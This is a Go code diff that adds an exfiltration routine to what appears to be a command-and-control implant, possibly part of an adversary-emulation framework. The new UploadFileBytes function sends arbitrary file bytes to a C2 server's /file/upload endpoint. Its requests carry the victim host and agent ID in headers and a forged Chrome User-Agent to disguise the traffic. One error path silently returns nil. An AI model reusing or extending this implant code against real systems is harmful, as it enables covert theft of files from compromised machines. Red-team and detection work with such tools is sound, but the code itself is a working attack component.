@@ -5,8 +5,11 @@ import (
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
+	"errors"
 	"fmt"
+	"io"
 	"io/ioutil"
+	"mime/multipart"
 	"net/http"
 	"net/url"
 	"path/filepath"
@@ -16,6 +19,7 @@ import (
 
 var (
 	apiBeacon = "/beacon"
+	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
 )
 
 //API communicates through HTTP
@@ -118,6 +122,72 @@ func (a *API) SendExecutionResults(profile map[string]interface{}, result map[st
 
 func (a *API) GetName() string {
 	return a.name
+}
+
+func (a *API) UploadFileBytes(profile map[string]interface{}, uploadName string, data []byte) error {
+	c2address, ok := profile["server"].(string)
+	if !ok {
+		return errors.New("No server address provided in profile.")
+	}
+	uploadUrl := c2address + "/file/upload"
+
+	// Set up the form
+	requestBody := bytes.Buffer{}
+	contentType, err := createUploadForm(&requestBody, data, uploadName)
+	if err != nil {
+		return nil
+	}
+
+	// Set up the request
+	headers := map[string]string{
+		"Content-Type": contentType,
+		"X-Request-Id": fmt.Sprintf("%s-%s", profile["host"].(string), profile["paw"].(string)),
+		"User-Agent": userAgent,
+		"X-Paw": profile["paw"].(string),
+		"X-Host": profile["host"].(string),
+	}
+	req, err := createUploadRequest(uploadUrl, &requestBody, headers)
+	if err != nil {
+		return err
+	}
+
+	// Perform request and process response
+	resp, err := a.client.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == http.StatusOK {
+		return nil
+	} else {
+		return errors.New(fmt.Sprintf("Non-successful HTTP response status code: %d", resp.StatusCode))
+	}
+	return nil
+}
+
+func createUploadForm(requestBody *bytes.Buffer, data []byte, uploadName string) (string, error) {
+	writer := multipart.NewWriter(requestBody)
+	defer writer.Close()
+	dataReader := bytes.NewReader(data)
+	formWriter, err := writer.CreateFormFile("file", uploadName)
+	if err != nil {
+		return "", err
+	}
+	if _, err = io.Copy(formWriter, dataReader); err != nil {
+		return "", err
+	}
+	return writer.FormDataContentType(), nil
+}
+
+func createUploadRequest(uploadUrl string, requestBody *bytes.Buffer, headers map[string]string) (*http.Request, error) {
+	req, err := http.NewRequest("POST", uploadUrl, requestBody)
+	if err != nil {
+		return nil, err
+	}
+	for header, val := range headers {
+		req.Header.Set(header, val)
+	}
+	return req, nil
 }
 
 func (a *API) request(address string, data []byte) []byte {
